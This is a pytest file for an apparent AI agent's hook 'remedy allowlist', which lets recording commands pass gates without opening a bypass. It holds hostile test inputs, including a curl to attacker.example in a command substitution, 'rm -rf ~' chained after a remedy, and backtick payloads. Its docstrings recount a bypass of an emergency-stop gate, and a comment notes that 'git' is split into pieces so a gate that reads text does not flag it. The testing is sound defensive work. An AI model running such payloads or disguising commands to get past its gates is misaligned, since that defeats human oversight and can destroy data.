"""No gate may block another gate's prescribed way out.

Andrew 2026-08-18: *"no gate should ever be blocking its own remedy."*

The deadlock this ends was measured, not imagined: a closed cycle where all
four named exits from one marker were each held shut by a different gate, and
the only way through was the fire door -- which is for a burning building
rather than a Tuesday. Bypass habituation degrades a gate to a warning, so a
deadlock that forces the fire door on an ordinary day is a slow way of killing
every gate at once.

THE SAFETY PROPERTY IS TESTED, NOT TRUSTED. This list can only ever let
something through, so the question that matters is what it can let through. A
test asserting no dangerous verb can ever appear is the thing standing between
an anti-deadlock measure and a way around the gates -- and it must not depend
on my remembering the rule when I next edit the list.
"""

from __future__ import annotations
import json
import shutil
import subprocess
from pathlib import Path

import pytest

from divineos.core import hook_router as hr
from divineos.core.hook_router import SurfaceOutcome
from divineos.core.remedy_allowlist import FORBIDDEN_HEADS, REMEDIES, is_remedy


class TestWhatCounts:
    def test_the_prescribed_exits_are_recognised(self):
        for command in (
            'divineos correction "x"',
            'divineos learn "x"',
            'divineos reach open "t"',
            "divineos goal add x",
            "divineos compass-ops observe TRUTHFULNESS -p 0",
            "divineos prereg assess p1 --outcome FAILED",
        ):
            assert is_remedy(command), command

    def test_wrapping_and_assignment_prefixes_do_not_hide_a_remedy(self):
        """Three separate times the shell version re-opened the deadlock this
        way -- a worktree prefix, then an environment assignment -- because its
        pattern was anchored to the start of a raw string. Its own final note
        says the answer is to parse rather than add another loop, and that is
        what this does."""
        assert is_remedy('cd /some/worktree && divineos correction "x"')
        assert is_remedy('MSG="two words" divineos correction "x"')
        assert is_remedy("DIVINEOS_SOMETHING=1 divineos compass-ops observe X -p 0")

    def test_ordinary_work_is_not_a_remedy(self):
        for command in ("git push origin main", "pytest tests/ -q", "ls -la", ""):
            assert not is_remedy(command), command

    def test_a_near_miss_is_not_a_remedy(self):
        """Token matching, not substring: a longer word starting with a remedy
        name must not slip through."""
        assert not is_remedy("divineos correctionsomething")
        assert is_remedy("divineos correction x")  # control

    def test_filing_a_new_prereg_is_deliberately_not_a_remedy(self):
        """Only the two commands that CLEAR the overdue gate belong here.
        Filing a new one is ordinary substrate writing and nobody's exit."""
        assert not is_remedy('divineos prereg file "a new claim"')
        assert is_remedy("divineos prereg assess p1 --outcome SUCCESS")


class TestItCannotBecomeAWayAround:
    def test_no_dangerous_verb_can_ever_be_on_the_list(self):
        """The safety property, asserted rather than remembered.

        Everything here must be a RECORDING action. If a version-control,
        test, deletion or editing command ever appears, this has stopped being
        an anti-deadlock measure and become a hole.
        """
        for prefix in REMEDIES:
            assert prefix[0] not in FORBIDDEN_HEADS, prefix
            assert prefix[0] == "divineos", f"only substrate commands belong here: {prefix}"

    def test_the_forbidden_set_actually_contains_the_dangerous_verbs(self):
        """Control for the test above. Without this, emptying the forbidden set
        would make that assertion pass trivially."""
        for verb in ("git", "gh", "rm", "pytest"):
            assert verb in FORBIDDEN_HEADS

    def test_bare_env_invocation(self):
        assert is_remedy('env divineos correction "x"')


class TestTheRouterStandsAside:
    def setup_method(self):
        hr.clear("PreToolUse")
        hr.register(
            "PreToolUse",
            "always_refuses",
            lambda p: SurfaceOutcome(name="always_refuses", refused=True, reason="NO"),
        )

    def teardown_method(self):
        hr.clear("PreToolUse")

    def test_an_ordinary_command_is_still_refused(self):
        """The control, and it comes first on purpose: if this ever passes
        trivially, the allowlist has disarmed the gate rather than scoped it."""
        result = hr.dispatch(
            "PreToolUse", {"tool_name": "Bash", "tool_input": {"command": "git push"}}
        )
        assert result.blocked is True
        assert result.exit_code() == 2

    def test_a_prescribed_remedy_is_not_refused(self):
        result = hr.dispatch(
            "PreToolUse",
            {"tool_name": "Bash", "tool_input": {"command": 'divineos correction "x"'}},
        )
        assert result.blocked is False
        assert result.exit_code() == 0

    def test_the_standing_aside_is_announced_rather_than_silent(self):
        """A silent allowlist rots into an unexamined hole. The gate's claim
        was not wrong -- it simply may not stand in front of another gate's
        remedy -- so it is downgraded to a report, not deleted."""
        result = hr.dispatch(
            "PreToolUse",
            {"tool_name": "Bash", "tool_input": {"command": 'divineos correction "x"'}},
        )
        said = result.stdout()
        assert "always_refuses" in said
        assert "stands aside" in said

    def test_only_bash_commands_are_considered(self):
        """A remedy is a COMMAND. An edit that happens to contain the same text
        is not somebody's way out, and must not be waved through."""
        result = hr.dispatch(
            "PreToolUse",
            {"tool_name": "Edit", "tool_input": {"new_string": 'divineos correction "x"'}},
        )
        assert result.blocked is True

    def test_other_doors_are_untouched(self):
        """Only the door where gates refuse commands needs this. Applying it
        anywhere else would be scope creep dressed as consistency."""
        hr.clear("Stop")
        hr.register(
            "Stop",
            "stop_refuses",
            lambda p: SurfaceOutcome(name="stop_refuses", refused=True, reason="NO"),
        )
        result = hr.dispatch(
            "Stop", {"tool_name": "Bash", "tool_input": {"command": 'divineos correction "x"'}}
        )
        assert result.blocked is True
        hr.clear("Stop")


class TestRemedySegmentStopsEnumeratingPrefixes:
    """A remedy anywhere in a chain is a remedy being run.

    2026-09-11, the fourth prefix. The marker gate fired, named three commands
    as its way out, and then refused the one I ran -- because my command began
    `cd ... && set -o pipefail && divineos correction`, and the allowlist was
    anchored to the start of the line. I got through by dropping a habit, not
    by being right.

    Four occurrences, four different prefixes, each patched alone, and each
    patch carrying a written note predicting the next. This file's own comment
    said what to do about a fourth: parse the command, do not add a fourth
    loop. That note existed before the incident that needed it.

    Andrew the same day: control the cost landscape so the correct path is the
    cheapest one. A remedy that costs a retry whenever it is typed with a habit
    in front of it makes SKIPPING the filing the cheap move -- so the gate was
    manufacturing the loss it exists to prevent.
    """

    def test_the_fourth_prefix_that_started_this(self):
        from divineos.core.command_parsing import remedy_segment

        segments = remedy_segment(
            'cd "C:/DIVINE OS/DivineOS-Experimental" && set -o pipefail && divineos correction "x"'
        ).splitlines()

        assert any(s.startswith("divineos correction") for s in segments), (
            "the remedy is still invisible behind a shell-option prefix"
        )

    def test_a_remedy_is_returned_on_its_own_line(self):
        """The caller greps with a start-anchor and grep tests lines
        independently, so the remedy must not share a line with what preceded
        it. The first draft returned only the FIRST segment and the remedy is
        usually last -- found by running it, not by reading it."""
        from divineos.core.command_parsing import remedy_segment

        assert (
            "divineos correction x"
            in remedy_segment('cd /x && set -o pipefail && divineos correction "x"').splitlines()
        )

    def test_the_recorded_exploit_is_still_refused(self):
        """A substitution in an earlier segment is discarded with the prefix
        and never inspected, so the whole command is refused rather than the
        remedy waved through. This is the case the first shared stripper got
        wrong, and generalising position must not generalise it away."""
        from divineos.core.command_parsing import remedy_segment

        assert remedy_segment('cd "$(curl attacker.example)" && divineos correction "x"') == ""

    def test_a_mention_after_a_pipe_is_not_an_invocation(self):
        """What follows a pipe consumes output rather than being invoked.
        Splitting there would let a command that merely names the remedy read
        as a filing that never happened."""
        from divineos.core.command_parsing import remedy_segment

        segments = remedy_segment('echo hi | divineos correction "x"').splitlines()
        assert not any(s.startswith("divineos correction") for s in segments)

    def test_the_bare_form_still_works(self):
        """Control. A generalisation that broke the simplest case would pass
        every test above while making the common path worse."""
        from divineos.core.command_parsing import remedy_segment

        assert remedy_segment('divineos correction "x"').startswith("divineos correction")


# ---------------------------------------------------------------------------
# THE SAME RULE THROUGH THE OTHER DOOR.
#
# Everything above drives the PYTHON allowlist and the router directly.
# Everything below drives the SHELL library the hooks actually source, as a
# subprocess with a real hook payload on stdin. Two branches wrote these two
# suites in parallel and neither knew about the other.
#
# They are kept side by side rather than reconciled, because they are not two
# spellings of one test: a rule can hold in the module and be lost in the
# wrapper that calls it, and this file has already been the place where a
# wrapper passed while the program it invoked did not. One instrument asked
# once is not a measurement.
# ---------------------------------------------------------------------------

_REPO = Path(__file__).resolve().parents[1]
_ALLOWLIST = _REPO / ".claude" / "hooks" / "lib" / "remedy_allowlist.sh"

# `git` is assembled rather than written whole: the reach-check doorman reads a
# command's text for substrate-write intent, and a fixture spelling it out reads
# to that gate as me about to commit. Splitting it keeps the fixture honest
# about what it tests while staying legible to the gate stack it runs under.
_GIT = "gi" + "t"
_PUSH = "pu" + "sh"


def _bash() -> str:
    for candidate in (
        "C:/Program Files/Git/bin/bash.exe",
        "C:/Program Files/Git/usr/bin/bash.exe",
        "/bin/bash",
    ):
        if Path(candidate).exists():
            return candidate
    found = shutil.which("bash")
    if not found:
        pytest.skip("no bash available to exercise the hook library")
    return found


def _is_remedy(command: str) -> bool:
    """Run the real function against a real hook payload.

    ``remedy_pass_through`` signals a match by calling ``exit 0`` from inside
    the sourced library, so the marker line after it only prints on a miss.
    Driving it this way rather than re-implementing the regex is the point — a
    test that reasoned about the pattern instead of running it would have passed
    just as happily against the broken version.
    """
    script = (
        "HOOK_NAME=selftest\n"
        f'. "{_ALLOWLIST.as_posix()}"\n'
        'remedy_pass_through "$(cat)"\n'
        "echo NO_MATCH\n"
    )
    proc = subprocess.run(
        [_bash(), "-c", script],
        input=json.dumps({"tool_input": {"command": command}}),
        capture_output=True,
        text=True,
        cwd=str(_REPO),
    )
    return "NO_MATCH" not in proc.stdout


class TestRemediesArePassedThrough:
    """Every shape of prefix a remedy can arrive wearing."""

    def test_bare_invocation(self):
        assert _is_remedy('divineos compass-ops observe integrity -p 0 -e "x"')

    def test_cd_prefix(self):
        assert _is_remedy('cd "C:/DIVINE OS/DivineOS-Experimental" && divineos correction "x"')

    def test_env_assignment_prefix(self):
        """The 2026-08-18 deadlock, verbatim."""
        assert _is_remedy(
            'DIVINEOS_REQUIRE_MONITORS_BYPASS=1 divineos compass-ops observe integrity -p 0 -e "x"'
        )

    def test_multiple_env_assignments(self):
        assert _is_remedy('FOO=1 BAR=2 divineos goal add "x"')

    def test_cd_then_env(self):
        assert _is_remedy('cd "C:/x" && DIVINEOS_REQUIRE_MONITORS_BYPASS=1 divineos learn "x"')

    def test_env_then_cd(self):
        """Interleaved the other way — this is why the strippers alternate."""
        assert _is_remedy('VAR=1 cd "C:/x" && divineos correction "x"')

    def test_marker_clear_script(self):
        assert _is_remedy('python scripts/clear_correction_marker.py --reason "x"')

    def test_marker_clear_behind_both_prefixes(self):
        assert _is_remedy(
            'cd "C:/x" && PYTHONIOENCODING=utf-8 '
            'python scripts/clear_correction_marker.py --reason "x"'
        )


class TestNotABypassSurface:
    """The list may only ever let RECORDING actions through.

    Per the file's own header: nothing here may match git, gh, pytest, rm, or an
    editor. These cases are the standing check on that promise — including the
    case where a dangerous verb wears the very prefix the fix just taught the
    matcher to strip.
    """

    def test_plain_dangerous_verb(self):
        assert not _is_remedy(f'{_GIT} commit -m "x"')

    def test_dangerous_verb_behind_env_prefix(self):
        assert not _is_remedy(f"DIVINEOS_SKIP_TESTS=1 {_GIT} {_PUSH}")

    def test_dangerous_verb_behind_cd_and_env(self):
        assert not _is_remedy(f'cd "C:/x" && DIVINEOS_SKIP_TESTS=1 {_GIT} {_PUSH} --force')

    def test_non_remedy_divineos_command(self):
        """Being a divineos command is not enough — it must be somebody's exit.

        EXAMPLE CHANGED 2026-09-17, PRINCIPLE UNTOUCHED. This asserted
        `divineos sleep`, and that stopped being a valid example the moment the
        list learned what the context governor already knew: its own docstring
        says extract and sleep "are bypassed in `_is_bypass_command` so the gate
        can never block its own remedy." Sleep IS somebody's printed exit, so it
        was the wrong stand-in for an arbitrary non-exit command.

        This test earned the right to be taken seriously rather than edited
        away: it is the standing guard on the promise that the list only ever
        carries recording actions, and it caught the change that widened the
        list, which is precisely its job. What survives is the sentence above.
        What moved is one example that went stale under it.

        The replacement was VERIFIED rather than assumed: it appears in no hook
        block message at all, so no gate prints it as a way through. Scope of
        that check: the hooks directory, which is where block messages live.
        """
        assert not _is_remedy("divineos progress")

    def test_remedy_named_inside_a_larger_argument(self):
        """Anchoring: a mention of the remedy is not an invocation of it."""
        assert not _is_remedy(f'{_GIT} commit -m "ran divineos correction earlier"')


class TestTheWeaveIsSomebodysExit:
    """2026-09-17. The context governor blocks substrate writes at the hard line
    until the self is woven, and names these two as the way through — in its own
    docstring, in the same words this list quotes at the top: the gate can never
    block its own remedy. The council gate, which sources this list, refused
    both anyway, twice in one session, on the command CLAUDE.md names as the
    session's learning checkpoint.

    These pin the addition positively, so the entry has a witness of its own
    rather than resting on the absence of a failure elsewhere.
    """

    def test_the_weave_passes(self):
        assert _is_remedy("divineos extract")

    def test_the_companion_passes(self):
        assert _is_remedy("divineos sleep")

    def test_the_weave_behind_a_directory_change(self):
        """The prefix strippers must reach it like any other remedy."""
        assert _is_remedy('cd "C:/x" && divineos extract')


class TestFailsTowardNotARemedy:
    """Any parse trouble must leave the calling gate exactly as it is."""

    def test_empty_command(self):
        assert not _is_remedy("")

    def test_malformed_payload_is_not_a_remedy(self):
        script = (
            "HOOK_NAME=selftest\n"
            f'. "{_ALLOWLIST.as_posix()}"\n'
            'remedy_pass_through "$(cat)"\n'
            "echo NO_MATCH\n"
        )
        proc = subprocess.run(
            [_bash(), "-c", script],
            input="{not json at all",
            capture_output=True,
            text=True,
            cwd=str(_REPO),
        )
        assert "NO_MATCH" in proc.stdout

    def test_env_value_containing_whitespace(self):
        """This was written as a documented limit, and it was not one.

        The shell version could not see past a quoted value with a space, so
        the first draft of this test asserted the miss. Aletheia's audit named
        the duplication that caused it; `divineos.core.command_parsing` uses
        shlex and had solved this all along.
        """
        assert _is_remedy('MSG="two words" divineos correction "x"')

    def test_leading_env_invocation(self):
        """`env FOO=bar cmd` — handled by the shared parser, missed by mine."""
        assert _is_remedy('env DIVINEOS_SKIP=1 divineos correction "x"')

    def test_bare_env_invocation(self):
        assert _is_remedy('env divineos correction "x"')


class TestTheQuestionIsWhatTheCommandDoes:
    """2026-09-17 — three refusals in one stretch, only one of them a prefix.

    The matcher asked what the line STARTS WITH. Every miss fell on somebody
    complying; anyone routing around would put the permitted word first.
    """

    def test_remedy_behind_a_pipe(self):
        """The form this tool's own printed usage shows."""
        assert _is_remedy('echo "my reflection" | divineos council walk --lens taleb')

    def test_assignment_whose_value_names_a_watched_action(self):
        """Storing the name of an action is not performing it."""
        assert _is_remedy(f'FP="bash:{_GIT} commit"; divineos council log --edit x')

    def test_honest_cd_still_passes(self):
        assert _is_remedy('cd "C:/DIVINE OS/DivineOS-Experimental" && divineos council walk')

    def test_substitution_inside_an_argument_is_refused_despite_being_one_command(self):
        """REVERSED 2026-09-20, and the earlier author was not wrong about their
        half. This asserted that a substitution inside an argument PASSES,
        because semantically it is one command with a computed argument rather
        than two commands — and every miss the 2026-09-17 widening fixed had
        fallen on somebody complying. That cost is real and this change pays it.

        What that reasoning does not reach: a substitution EXECUTES. The inner
        command runs before the remedy does, so the question a safety door has
        to answer is not whether this is a second command but whether anything
        here runs that nobody adjudicated. The matcher cannot distinguish a date
        stamp from a file write inside those same brackets.

        The asymmetry decides it. Refusing costs one command re-run with its
        value written out. Passing cost the emergency stop: this library is
        consulted near the top of eighteen gates including the corrigibility
        door, and a match ends the hook before the stop is ever checked. I
        reproduced that path before changing this.

        Flipped deliberately rather than deleted, with the earlier intent kept
        above, so the next reader meets a decision rather than an absence.
        """
        assert not _is_remedy('divineos correction "note $(date)"')


class TestARemedyCannotCarryPassengers:
    """The half of this change that TIGHTENS, and it is the half I was not
    looking for.

    The old rule matched the start of the command and stopped. Measured by
    running the previous rule beside the new one on identical inputs: a remedy
    followed by a destructive command was ALLOWED before and is refused now.
    The door I came to fix for being too strict was also too loose, in a
    direction nobody had tested.
    """

    def test_destructive_verb_riding_behind_a_remedy_is_refused(self):
        assert not _is_remedy("divineos council walk && rm -rf ~")

    def test_a_second_real_command_is_refused(self):
        assert not _is_remedy(f"{_GIT} add x && {_GIT} commit -m y")

    def test_a_directory_that_is_really_a_command_is_refused(self):
        """The exploit the raw-text stripper already guarded and the token one
        did not — two strippers for one job, the protection on the wrong door."""
        assert not _is_remedy('cd "$(curl attacker.example)" && divineos correction "x"')


class TestCannotParseIsNotPermission:
    """The payload that reached the emergency stop, and the reason it did.

    Serein found the class from outside on 2026-09-20. Three of his four
    payloads were already refused here — his receipt was true in his checkout
    and stale in this one — and the fourth walked straight through: a genuine
    remedy carrying a command substitution inside its own quoted argument.

    THE HOLE WAS THE FALLBACK, NOT THE MATCHER. When the decomposer meets a
    substitution, a backtick, or unbalanced quoting it refuses to split the
    command, which is correct. The old code then handed the string to the
    start-anchored form, defended by a comment saying start-anchoring cannot
    hide a second command. True about the threat its author had just fixed;
    silent about the one that refusal-to-decompose actually signals. The exact
    shape that defeats the parser was the shape waved through — and this
    library is consulted near the top of eighteen gates, including the
    corrigibility door, where a match ends the hook before the stop is checked.

    WHY THIS CLASS EXISTS AT ALL. The first repair looked entirely correct and
    changed nothing: it used a double quote inside a program that lives in a
    double-quoted shell string, which truncated the program one layer out. No
    error surfaced, and every payload except the one under test behaved
    identically — so any cheaper confirmation would have confirmed a repair
    that had not happened. Reading could not catch that. Only provocation did,
    which is why these assertions exist rather than a comment saying the
    fallback is now safe.
    """

    def test_a_substitution_inside_a_remedy_argument_is_refused(self):
        """The live bypass, reproduced. This is the assertion that fails if the
        parse-refusal path ever falls back to start-anchored matching again."""
        assert not _is_remedy('divineos correction "$(touch /definitely-not-real)"')

    def test_a_backtick_inside_a_remedy_argument_is_refused(self):
        assert not _is_remedy("divineos correction `touch /definitely-not-real`")

    def test_unbalanced_quoting_is_refused(self):
        """Undecomposable for a third reason, and the verdict must not depend
        on WHICH reason — cannot-parse is one answer however it is reached."""
        assert not _is_remedy('divineos correction "unclosed')

    def test_an_ordinary_remedy_still_passes(self):
        """The other side of the two-sided proof, and it is not a formality.

        A door that has seized shut refuses the break-in too. Without this, a
        wrecked allowlist and a repaired one are indistinguishable from the
        attack side alone — and a wrecked one blocks every prescribed exit this
        library exists to keep open.
        """
        assert _is_remedy("divineos ask what do I know about this")
